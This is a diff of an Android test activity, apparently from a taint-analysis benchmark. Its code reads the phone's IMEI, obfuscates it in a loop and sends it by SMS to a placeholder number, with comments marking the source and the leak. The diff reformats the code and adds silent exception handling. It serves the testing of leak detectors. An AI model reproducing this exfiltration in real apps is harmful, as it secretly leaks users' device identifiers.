@@ -22,18 +22,23 @@ public class LoopExample2 extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_loop_example2);
-        
+    try{
         TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-		String imei = telephonyManager.getDeviceId(); //source
+								String imei = telephonyManager.getDeviceId(); //source
 		
-		String obfuscated = "";
-		for(int i = 0; i < 10; i++)
-			if(i == 9)
-				for(char c : imei.toCharArray())
-					obfuscated += c + "_";
-		
-		SmsManager sm = SmsManager.getDefault();
+							String obfuscated = "";
+							for(int i = 0; i < 10; i++){
+								if(i == 9){
+										char c[] = imei.toCharArray();
+										for( int j=0; j<c.length; j++ ){
+														obfuscated += c[j] + "_";
+										}
+									}
+					}
+					SmsManager sm = SmsManager.getDefault();
 
-		sm.sendTextMessage("+49 1234", null, obfuscated, null, null); //sink, leak
+				sm.sendTextMessage("+49 1234", null, obfuscated, null, null); //sink, leak
+				}catch(NullPointerException e){
+				}catch(ClassCastException ignore){}
     }    
 }
